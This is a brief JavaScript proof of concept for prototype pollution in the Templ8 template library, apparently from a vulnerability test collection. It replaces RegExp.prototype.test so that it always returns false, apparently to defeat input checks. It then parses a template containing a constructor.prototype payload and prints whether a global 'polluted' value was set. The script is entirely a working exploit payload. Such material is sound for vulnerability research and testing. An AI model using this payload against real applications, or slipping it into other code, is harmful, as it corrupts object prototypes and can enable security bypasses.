RegExp.prototype.test = () => false;
console.log({}.polluted);
const Templ8 = require('Templ8');
const tpl = new Templ8('{{constructor.prototype.polluted="yes"}}');
tpl.parse();
try {
    console.log('{ ' + polluted + ', ' + 'yes' + ' }');
} catch {
    console.log('{ ' + false + ', ' + true + ' }');
}